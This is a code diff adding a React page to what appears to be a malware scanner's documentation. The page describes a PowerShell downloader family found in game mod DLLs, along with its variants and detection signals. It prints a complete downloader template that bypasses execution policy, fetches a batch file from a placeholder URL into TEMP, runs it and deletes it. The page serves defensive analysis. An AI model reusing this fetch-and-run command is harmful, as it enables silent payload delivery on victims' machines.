@@ -1,0 +1,41 @@
+export default function PowerShellIwrDlBatFamilyContent() {
+  return (
+    <>
+      <h2>Behavior Pattern</h2>
+      <p>
+        This downloader template starts hidden PowerShell, uses <code>Invoke-WebRequest</code> / <code>iwr</code> to place a batch file in
+        <code>%TEMP%</code>, executes the batch file, waits, and deletes the staged script.
+      </p>
+
+      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
+        <code>{String.raw`powershell.exe -ep bypass -c "
+iwr '<url>' -out $env:TEMP\dl.bat -useb;
+if (Test-Path $env:TEMP\dl.bat) {
+  Start-Process -NoNewWindow $env:TEMP\dl.bat;
+  Start-Sleep -Seconds 120;
+  Remove-Item $env:TEMP\dl.bat -Force
+}"`}</code>
+      </pre>
+
+      <h2>Why It Clusters Cleanly</h2>
+      <ul>
+        <li>Same launcher: <code>powershell.exe</code> with execution-policy bypass</li>
+        <li>Same staging filename: <code>dl.bat</code></li>
+        <li>Same cleanup pattern: wait then delete</li>
+        <li>Only the domain and path tend to rotate between uploads</li>
+      </ul>
+
+      <h2>Observed Variants</h2>
+      <p>
+        <code>EndlessGraffiti.dll.di</code> and <code>FasterGrowth.dll.di</code> both use this recipe, with only infrastructure changes between them.
+      </p>
+
+      <h2>Key Signals In MLVScan</h2>
+      <ul>
+        <li><code>ProcessStartRule</code> on <code>powershell.exe</code></li>
+        <li>Hidden execution with shell execute and TEMP working directory</li>
+        <li>Command-line normalization for <code>iwr</code>, <code>dl.bat</code>, sleep, and deletion</li>
+      </ul>
+    </>
+  )
+}
